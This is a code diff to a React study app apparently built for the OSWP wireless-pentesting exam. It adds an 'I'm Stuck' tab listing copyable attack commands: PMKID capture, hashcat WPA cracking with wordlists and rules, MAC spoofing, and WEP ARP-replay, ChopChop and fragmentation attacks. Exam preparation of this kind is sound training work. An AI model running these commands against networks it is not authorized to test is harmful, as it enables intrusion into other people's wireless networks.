@@ -282,6 +282,9 @@ const CSS=`
 .tshoot-h{padding:10px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:background .1s;font-size:12px;font-weight:600;color:var(--t0)}
 .tshoot-h:hover{background:var(--b3)}
 .tshoot-a{border-top:1px solid var(--bd);padding:10px 14px}
+.stuck-card{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:12px 14px;margin-bottom:8px}
+.stuck-q{font-size:13px;font-weight:700;color:var(--t0);margin-bottom:4px}
+.stuck-tip{font-size:11px;color:var(--t2);margin-bottom:6px}
 `;
 
 // ━━━ COMPONENTS ━━━
@@ -425,6 +428,36 @@ function TroubleshootTab(){
   </div>)
 }
 
+// ━━━ TAB: I'M STUCK ━━━
+function StuckTab(){
+  const checks=[
+    { q: "Is your adapter in monitor mode?", cmd: "iwconfig\n# Should show Mode:Monitor\n\n# If not:\nsudo airmon-ng check kill\nsudo airmon-ng start wlan0", tip: "Most failures start here. Verify with 'iwconfig' that you see Monitor mode active.", critical: true },
+    { q: "Does your adapter support injection?", cmd: "sudo aireplay-ng --test wlan0mon\n# Should show: Injection is working!\n\n# If it fails: try a different driver\nsudo modprobe -r ath9k_htc && sudo modprobe ath9k_htc", tip: "Not all adapters support injection. If test fails, check dmesg for driver errors.", critical: true },
+    { q: "Are you on the correct channel?", cmd: "# Lock to target channel:\nsudo iwconfig wlan0mon channel 6\n\n# Verify:\niwconfig wlan0mon | grep Channel", tip: "If you're on the wrong channel, you won't see the target AP or its clients.", critical: true },
+    { q: "Did you try PMKID instead of handshake?", cmd: "# PMKID needs NO client!\nsudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng\nhcxpcapngtool -o pmkid.hc22000 pmkid.pcapng\nhashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt", tip: "If no clients are connected (can't capture handshake), try PMKID attack — it doesn't require a client.", critical: true },
+    { q: "Is the handshake file valid?", cmd: "# Verify handshake:\nsudo aircrack-ng capture.cap\n# Must show: '1 handshake'\n\n# Wireshark: filter 'eapol'\n# Need messages 1+2 or 2+3 minimum", tip: "If aircrack-ng doesn't show a handshake, deauth more aggressively or try a different client." },
+    { q: "Did you try a bigger/different wordlist?", cmd: "# Custom wordlists:\ncewl http://company-site.com -d 3 -m 4 -w custom.txt\ncrunch 8 12 -t @@@@%%%% -o patterns.txt\n\n# SecLists WiFi wordlists:\n/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt\n\n# hashcat with rules:\nhashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule", tip: "If rockyou.txt doesn't work in 5 min, try context-specific wordlists and hashcat rules.", critical: true },
+    { q: "Is MAC filtering blocking you (WEP)?", cmd: "# Check who's connected:\nsudo airodump-ng wlan0mon --bssid BSSID -c CH\n\n# Spoof a connected client MAC:\nsudo airmon-ng stop wlan0mon\nsudo macchanger -m CLIENT_MAC wlan0\nsudo airmon-ng start wlan0", tip: "If fake auth keeps failing, the AP might use MAC filtering. Spoof a known-good client MAC." },
+    { q: "Are WEP IVs accumulating fast enough?", cmd: "# If IVs are slow, use ARP replay:\nsudo aireplay-ng -3 -b BSSID -h YOUR_MAC wlan0mon\n\n# No client? Try ChopChop or fragmentation:\nsudo aireplay-ng -4 -b BSSID -h YOUR_MAC wlan0mon\nsudo aireplay-ng -5 -b BSSID -h YOUR_MAC wlan0mon", tip: "You need ~20k-40k IVs for WEP cracking. ARP replay is the fastest way to generate them." },
+    { q: "Can you connect after cracking?", cmd: "# Stop monitor mode FIRST:\nsudo airmon-ng stop wlan0mon\nsudo systemctl start NetworkManager\n\n# WPA connect:\nwpa_passphrase 'SSID' 'password' > /tmp/wpa.conf\nsudo wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf\nsudo dhclient wlan0", tip: "Remember to stop monitor mode and restart NetworkManager before trying to connect normally.", critical: true },
+  ];
+  return(<div>
+    <div className="score-bar"><div className="score-seg" style={{background:'rgba(239,68,68,.08)',color:'var(--r)',flex:2}}>{`⚠️ You have 3h45m — Move fast! If a network is stuck after 30 min, try another one.`}</div></div>
+    <p style={{fontSize:11,color:'var(--t2)',marginBottom:14}}>Go through each question. If you answer "no" to ANY, do it before trying anything else.</p>
+    {checks.map((c,i)=><div className="stuck-card" key={i}>
+      <div style={{display:'flex',alignItems:'flex-start',gap:10,marginBottom:6}}>
+        <div className={`phase-num`} style={{width:24,height:24,fontSize:10,flexShrink:0,background:c.critical?'var(--acd)':'var(--b0)',borderColor:c.critical?'var(--ac)':'var(--bd)',color:c.critical?'var(--ac)':'var(--t2)'}}>{i+1}</div>
+        <div style={{flex:1}}>
+          <div className="stuck-q">{c.q}</div>
+          <div className="stuck-tip">{c.tip}</div>
+        </div>
+        <CopyBtn text={c.cmd}/>
+      </div>
+      <div className="cmd" style={{background:'var(--b0)',padding:8,borderRadius:4,fontSize:10,marginLeft:34}}>{c.cmd}</div>
+    </div>)}
+  </div>)
+}
+
 function NotesTab(){
   const[notes,setNotes]=useState(()=>localStorage.getItem('oswp-notes-v2')||`# OSWP Exam Notes\n\n## Network 1 (Mandatory)\nType: \nBSSID: \nESSID: \nChannel: \nEncryption: \nKey Found: \nproof.txt: \n\n## Network 2\nType: \nBSSID: \nESSID: \nChannel: \nEncryption: \nKey Found: \nproof.txt: \n\n## Network 3\nType: \nBSSID: \nESSID: \nChannel: \nEncryption: \nKey Found: \nproof.txt: \n\n## Screenshots Taken\n`);
   useEffect(()=>{localStorage.setItem('oswp-notes-v2',notes)},[notes]);
@@ -435,7 +468,7 @@ function NotesTab(){
 }
 
 // ━━━ MAIN APP ━━━
-const TABS=["🎯 Decision Engine","⚡ Quick Ref","✅ Checklist","⏱ Timer","🔧 Troubleshoot","📝 Notes"];
+const TABS=["🎯 Decision Engine","⚡ Quick Ref","🆘 I'm Stuck","✅ Checklist","⏱ Timer","🔧 Troubleshoot","📝 Notes"];
 
 function App(){
   const[tab,setTab]=useState(0);
@@ -465,10 +498,11 @@ function App(){
       <div className="main">
         {tab===0&&<DecisionTab vals={vals}/>}
         {tab===1&&<QuickRefTab/>}
-        {tab===2&&<ChecklistTab/>}
-        {tab===3&&<TimerTab/>}
-        {tab===4&&<TroubleshootTab/>}
-        {tab===5&&<NotesTab/>}
+        {tab===2&&<StuckTab/>}
+        {tab===3&&<ChecklistTab/>}
+        {tab===4&&<TimerTab/>}
+        {tab===5&&<TroubleshootTab/>}
+        {tab===6&&<NotesTab/>}
       </div>
     </div>
   </>)
